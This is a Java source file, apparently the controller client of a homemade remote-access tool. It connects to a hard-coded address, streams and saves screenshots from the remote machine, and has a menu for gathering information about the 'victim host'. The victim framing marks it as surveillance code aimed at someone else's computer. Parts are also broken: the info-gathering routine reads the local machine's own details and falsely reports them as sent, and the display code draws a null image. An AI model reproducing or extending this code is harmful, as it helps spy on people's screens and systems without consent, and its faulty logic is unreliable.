import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.Properties;
import java.util.Scanner;

import javax.imageio.ImageIO;
import javax.swing.*;

public class Client {

    private static File saveDirectory;

    public static void main(String[] args) {
        try {
            Socket socket = new Socket("192.168.0.153", 80);
            System.out.println("Connected to server -> " + socket.getInetAddress());

            JFrame frame = new JFrame("Remote Desktop Viewer");
            File mj = new File("C:\\Users\\Sirenx\\Documents\\1700881229_M.png");
            BufferedImage img = ImageIO.read(mj);
            frame.setIconImage(img);
            frame.setSize(800, 600);
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            frame.setLayout(new BorderLayout());
            frame.setBackground(Color.GRAY);

            // Read and display server information


            // Panel for buttons
            JPanel buttonPanel = new JPanel(new FlowLayout());

            JButton commandButton = new JButton("Disconnected");
            JButton screenshotButton = new JButton("Take Screenshot");

            // Action listener for command button
            commandButton.addActionListener(e -> {

              System.out.println("The Remote connection has been disconnected.");
              System.exit(0);

            });

            // Action listener for screenshot button
            screenshotButton.addActionListener(e -> {
                saveDirectory = showFileChooser(frame);
                if (saveDirectory != null) {
                    sendCommand(socket, "TakeScreenshot");
                }
            });

            // Add buttons to the panel
            buttonPanel.add(commandButton);
            buttonPanel.add(screenshotButton);

            // Add the button panel to the frame (at the top)
            frame.add(buttonPanel, BorderLayout.NORTH);

            // Panel for displaying the monitor
            JPanel monitorPanel = new JPanel() {
                @Override
                protected void paintComponent(Graphics g) {
                    super.paintComponent(g);
                    // Draw the image here (replace null with your BufferedImage)
                    g.drawImage(null, 0, 0, getWidth(), getHeight(), this);
                }
            };

            // Set a preferred size for the monitor display area
            monitorPanel.setPreferredSize(new Dimension(640, 480));

            // Add the monitor panel to the frame (at the center)
            frame.add(monitorPanel, BorderLayout.CENTER);

            frame.setVisible(true);

            // Start a separate thread for receiving desktop images
            new Thread(() -> {
                while (true) {

                    receiveDesktopImage(socket, monitorPanel);
                }
            }).start();
           Scanner Sc = new Scanner(System.in);
           System.out.println("Entre the commands?");
           System.out.println("1) get -> to get information about victim host");

           String menu = Sc.nextLine();
           if(menu.equals("get")){
                          getAndPrintServerInfo(socket);

           }
        } catch (Exception e) {
            e.printStackTrace();
        }

        
    }

    private static void receiveDesktopImage(Socket socket, JPanel monitorPanel) {
        try {
            DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());

            // Read the dimensions of the image
            int width = dataInputStream.readInt();
            int height = dataInputStream.readInt();

            // Read the image bytes
            byte[] imageBytes = new byte[width * height * 4]; // Assuming RGBA format
            dataInputStream.readFully(imageBytes);

            // Convert image bytes to BufferedImage
            BufferedImage screenshot = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
            screenshot.setRGB(0, 0, width, height, byteArrayToIntArray(imageBytes), 0, width);

            // Save the image to the specified directory
            saveImage(screenshot);

            SwingUtilities.invokeLater(() -> {
                updateMonitor(monitorPanel, screenshot);
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void updateMonitor(JPanel monitorPanel, BufferedImage screenshot) {
        Graphics g = monitorPanel.getGraphics();
        g.drawImage(screenshot, 0, 0, monitorPanel.getWidth(), monitorPanel.getHeight(), monitorPanel);
        g.dispose();
    }

    private static void getAndPrintServerInfo(Socket socket) {
        try {
            // Create output stream to send information to the server

            // Get operating system name
            String osName = System.getProperty("os.name");

            // Check if the user has administrator privileges (Windows specific)
            String isUser = System.getProperty("user.name");

            // Get local IP address of the client
            String localIpAddress = InetAddress.getLocalHost().getHostAddress();

            // Get external IP address of the client
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
            String externalIpAddress = in.readLine();

            // Create a map to store the information
            Properties infoMap = new Properties();
            infoMap.setProperty("OS Name", osName);
            infoMap.setProperty("User", isUser);
            infoMap.setProperty("Local IP Address", localIpAddress);
            infoMap.setProperty("External IP Address", externalIpAddress);

            // Send information to the server


            // Print information to the console
            System.out.println("Sent system information to the server:");
            infoMap.forEach((key, value) -> System.out.println(key + ": " + value));

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    


    private static void sendCommand(Socket socket, String command) {
        try {
            DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());

            // Send the length of the command
            dataOutputStream.writeInt(command.length());

            
            // Send the command bytes
            dataOutputStream.write(command.getBytes("UTF-8"));

            // Flush the stream to ensure that all data is sent immediately
            dataOutputStream.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    static boolean saved;
    private static File showFileChooser(JFrame frame) {
        JFileChooser fileChooser = new JFileChooser();
        fileChooser.setDialogTitle("Select Save Location");
        fileChooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);

        int userSelection = fileChooser.showSaveDialog(frame);

        if (userSelection == JFileChooser.APPROVE_OPTION) {
              Client.saved = true;
            return fileChooser.getSelectedFile();
        } else {
            return null;
        }
    }

    private static void saveImage(BufferedImage image) {
        try {
            if (saveDirectory != null&& Client.saved ==true) {
                String timestamp = Long.toString(System.currentTimeMillis());
                File outputFile = new File(saveDirectory, "screenshot_" + timestamp + ".png");
                ImageIO.write(image, "png", outputFile);
                System.out.println("Screenshot saved to: " + outputFile.getAbsolutePath());
                Client.saved = false;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static int[] byteArrayToIntArray(byte[] bytes) {
        int[] result = new int[bytes.length / 4];
        for (int i = 0; i < result.length; i++) {
            result[i] = ByteBuffer.wrap(bytes, i * 4, 4).getInt();
        }
        return result;
    }
    // 
    
}
